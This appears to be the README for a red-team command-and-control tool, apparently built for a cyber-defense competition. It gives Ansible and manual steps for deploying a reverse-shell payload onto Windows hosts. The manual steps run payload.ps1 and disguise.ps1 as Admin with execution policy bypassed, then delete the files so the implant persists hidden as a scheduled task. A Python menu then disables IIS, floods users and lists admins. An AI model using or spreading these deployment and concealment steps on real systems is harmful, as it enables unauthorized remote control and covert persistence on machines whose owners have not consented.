CDT Charlie Red Team C2 Tool
Darius FLontas 
function: A reverse shell C2 that deploys onto all target Windows boxes and lets you run attacks from a Python menu.
Setup:
sudo apt install ansible
pip install pywinrm --break-system-packages
ansible-galaxy collection install ansible.windows community.windows 
Deploy via ansible:
ansible-playbook -i inventory.ini deploy.yml
Run on terminal:
python3 c2_listener.py
How to use:
Type "i" to interact with a session by IP
Each session has an interactive shell and automation menu
Automations: disable IIS, flood users (dropdown of different methods), list admins, check status

DEPLOY MANUALLY:
Connect to a windows host, ex: kgb
Download disguise.ps1 and payload.ps1 through github
Run powershell as Admin
Enter command in THIS ORDER:
    powershell.exe -ExecutionPolicy Bypass -File "C:\User\kgb\Downloads\payload.ps1"
    powershell.exe -ExecutionPolicy Bypass -File "C:\User\kgb\Downloads\disguise.ps1"

Then delete the disguise.ps1 and payload.ps1 files because now its a scheduled task!


